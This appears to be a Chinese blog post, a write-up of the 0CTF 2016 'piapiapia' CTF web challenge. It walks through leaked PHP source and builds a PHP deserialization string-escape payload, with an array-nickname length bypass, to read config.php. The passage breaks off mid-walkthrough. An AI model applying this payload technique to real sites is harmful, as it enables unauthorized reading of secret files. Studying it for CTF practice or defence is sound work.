@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="我也太菜了吧 考点：反序列化字符串逃逸  源码泄露：www.zip  config.php: 1234567&lt;?php	$config[&amp;#x27;hostname&amp;#x27;] &#x3D; &amp;#x27;127.0.0.1&amp;#x27;;	$config[&amp;#x27;username&amp;#x27;] &#x3D; &amp;#x27;root&amp;#x27;;	$config[&amp;#x27;password&amp;#x27;] &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0CTF 2016 piapiapia">
+<meta property="og:url" content="http://example.com/2021/05/03/0CTF%202016%20piapiapia/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="我也太菜了吧 考点：反序列化字符串逃逸  源码泄露：www.zip  config.php: 1234567&lt;?php	$config[&amp;#x27;hostname&amp;#x27;] &#x3D; &amp;#x27;127.0.0.1&amp;#x27;;	$config[&amp;#x27;username&amp;#x27;] &#x3D; &amp;#x27;root&amp;#x27;;	$config[&amp;#x27;password&amp;#x27;] &#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021050302151655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-05-02T18:26:12.418Z">
+<meta property="article:modified_time" content="2021-05-02T18:26:06.768Z">
+<meta property="article:author" content="程勇胜">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2021050302151655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+
+<link rel="canonical" href="http://example.com/2021/05/03/0CTF%202016%20piapiapia/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>0CTF 2016 piapiapia | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">53</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/03/0CTF%202016%20piapiapia/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="程勇胜">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          0CTF 2016 piapiapia
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-03 02:26:12 / 修改时间：02:26:06" itemprop="dateCreated datePublished" datetime="2021-05-03T02:26:12+08:00">2021-05-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="我也太菜了吧"><a href="#我也太菜了吧" class="headerlink" title="我也太菜了吧"></a>我也太菜了吧</h1><ul>
+<li>考点：反序列化字符串逃逸</li>
+</ul>
+<p>源码泄露：<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> </p>
+<p>config.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现 flag</p>
+<a id="more"></a>
+
+<p>index.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>就是一个检测长度</p>
+<p>register.php也是经检测长度</p>
+<p>profile.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现 <code>file_get_contents</code> 并有一个反序列化操作，所以应该要对 <code>profile数组</code>进行操作，如果让 <code>$profile[&#39;photo&#39;]</code> 为config.php，那么就会得到base64过后的flag</p>
+<p>update.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注册信息存放在<code>$profile数组</code>中，且都存在过滤</p>
+<p>然后这个$profile数组会被序列化传到update_profile这个方法下序列化处理，</p>
+<p>然后跳转到profile.php页面进行查看。</p>
+<p>去看看update_profile这个方法所在的class.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现先经过父类中filter方法进行过滤处理后才进行了更新操作(PHP5中使用<code>parent::</code>来引用父类方法)</p>
+<p>查看filter方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个 <code>preg_replace</code> ，将 safe 中替换为 hacker ，其中之一考点出现，<code>反序列化字符串逃逸</code></p>
+<p>所以总体思路为：</p>
+<blockquote>
+<p>利用 filter 方法中的 pre_replace 函数，将 where(5长度) 替换成 hacker(6长度)，然后在 nickname 处进行反序列化字符串逃逸，令 profile[photo]=config.php 这样就包含了这个文件了</p>
+</blockquote>
+<p>但是在nickname处会发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>长度不能超过10，第二个考点出现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(Array()) &#x3D; null</span><br><span class="line">sha1(Array()) &#x3D; null</span><br><span class="line">ereg(pattern,Array()) &#x3D;null</span><br><span class="line">preg_match(pattern,Array()) &#x3D; false  </span><br><span class="line">strcmp(Array(), “abc”) &#x3D;null</span><br><span class="line">strpos(Array(),“abc”) &#x3D; null</span><br><span class="line">strlen(Array()) &#x3D; null		&#x2F;&#x2F;本题用到这个特性</span><br></pre></td></tr></table></figure>
+
+<p>利用NULL绕过</p>
+<p>构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$profile[&#39;phone&#39;] &#x3D; &#39;13588888888&#39;;</span><br><span class="line">$profile[&#39;email&#39;] &#x3D; &#39;123123123@qq.com&#39;;</span><br><span class="line">$profile[&#39;nickname&#39;][] &#x3D; &quot;name&quot;;   &#x2F;&#x2F;数组形式！！</span><br><span class="line">$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5(&#39;aaa&#39;);</span><br><span class="line"></span><br><span class="line">echo serialize($profile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<blockquote>
+<p>a:4:{s:5:”phone”;s:11:”13588888888”;s:5:”email”;s:16:”<a href="mailto:&#49;&#50;&#51;&#x31;&#x32;&#51;&#49;&#50;&#51;&#64;&#113;&#113;&#46;&#x63;&#111;&#x6d;">&#49;&#50;&#51;&#x31;&#x32;&#51;&#49;&#50;&#51;&#64;&#113;&#113;&#46;&#x63;&#111;&#x6d;</a>“;s:8:”nickname”;a:1:{i:0;s:4:”name”;}s:5:”photo”;s:39:”upload/47bce5c74f589f4867dbd57e9ca9f808”;}</p>
+</blockquote>
+<p>反序列化结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [phone] &#x3D;&gt; 13588888888</span><br><span class="line">    [email] &#x3D;&gt; 123123123@qq.com</span><br><span class="line">    [nickname] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt; name</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [photo] &#x3D;&gt; upload&#x2F;47bce5c74f589f4867dbd57e9ca9f808</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$profile[&#39;phone&#39;] &#x3D; &#39;13588888888&#39;;</span><br><span class="line">$profile[&#39;email&#39;] &#x3D; &#39;123123123@qq.com&#39;;</span><br><span class="line">$profile[&#39;nickname&#39;][] &#x3D; &quot;name&quot;;   &#x2F;&#x2F;数组形式！！</span><br><span class="line">$profile[&#39;photo&#39;] &#x3D; &#39;config.php&#39;;</span><br><span class="line"></span><br><span class="line">echo serialize($profile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<blockquote>
+<p>a:4:{s:5:”phone”;s:11:”13588888888”;s:5:”email”;s:16:”<a href="mailto:&#x31;&#50;&#x33;&#x31;&#x32;&#x33;&#x31;&#50;&#51;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;">&#x31;&#50;&#x33;&#x31;&#x32;&#x33;&#x31;&#50;&#51;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;</a>“;s:8:”nickname”;a:1:{i:0;s:4:”name”;}s:5:”photo”;s:10:”config.php”;}</p>
+</blockquote>
+<p>反序列化结果：</p>
